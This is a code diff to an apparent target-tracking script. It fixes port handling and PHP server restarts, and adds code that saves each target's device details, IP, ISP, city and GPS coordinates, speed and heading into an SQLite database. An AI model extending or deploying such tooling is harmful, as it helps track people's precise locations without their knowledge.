@@ -48,7 +48,7 @@ parser.add_argument(
 
 args = parser.parse_args()
 kml_fname = args.kml
-port = getenv('PORT') or args.port
+port = int(getenv('PORT') or args.port)
 chk_upd = args.update
 print_v = args.version
 telegram = getenv('TELEGRAM') or args.telegram
@@ -264,16 +264,9 @@ def server():
                 )
                 utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
                 try:
-                    sleep(1)
-                    if old_proc.status() != 'running':
-                        old_proc.kill()
-                    else:
-                        utils.print(f'{C}[ {R}✘{C} ]{W}')
-                        utils.print(
-                            f'{R}[-] {C}Unable to kill php server process, kill manually{W}'
-                        )
-                        sys.exit()
-                except psutil.NoSuchProcess:
+                    old_proc.kill()
+                    old_proc.wait(timeout=2)
+                except (psutil.NoSuchProcess, psutil.TimeoutExpired):
                     pass
             except psutil.NoSuchProcess:
                 utils.print(f'{C}[ {R}✘{C} ]{W}')
@@ -474,6 +467,45 @@ def csvout(row):
     with open(DATA_FILE, 'a') as csvfile:
         csvwriter = writer(csvfile)
         csvwriter.writerow(row)
+    try:
+        import db_manager
+        item = {
+            "os": row[0] if len(row) > 0 else "N/A",
+            "platform": row[1] if len(row) > 1 else "N/A",
+            "cores": row[2] if len(row) > 2 else "N/A",
+            "ram": row[3] if len(row) > 3 else "N/A",
+            "vendor": row[4] if len(row) > 4 else "N/A",
+            "render": row[5] if len(row) > 5 else "N/A",
+            "resolution": row[6] if len(row) > 6 else "N/A",
+            "browser": row[7] if len(row) > 7 else "N/A",
+            "ip": row[8] if len(row) > 8 else "N/A",
+        }
+        if len(row) >= 15:
+            if db_manager.clean_num(row[9]) is not None:
+                item["lat"] = row[9]
+                item["lon"] = row[10]
+                item["accuracy"] = row[11] if len(row) > 11 else None
+                item["altitude"] = row[12] if len(row) > 12 else None
+                item["direction"] = row[13] if len(row) > 13 else None
+                item["speed"] = row[14] if len(row) > 14 else None
+            else:
+                item["continent"] = row[9]
+                item["country"] = row[10]
+                item["region"] = row[11]
+                item["city"] = row[12]
+                item["org"] = row[13]
+                item["isp"] = row[14]
+                if len(row) >= 21:
+                    item["lat"] = row[15]
+                    item["lon"] = row[16]
+                    item["accuracy"] = row[17] if len(row) > 17 else None
+                    item["altitude"] = row[18] if len(row) > 18 else None
+                    item["direction"] = row[19] if len(row) > 19 else None
+                    item["speed"] = row[20] if len(row) > 20 else None
+        db_manager.insert_target(item)
+        utils.print(f'{G}[+] {C}SQLite Saved : {W}{path_to_script}/db/seeker.db')
+    except Exception as e:
+        utils.print(f'{Y}[!] SQLite insert failed: {e}{W}')
     utils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')
 
 
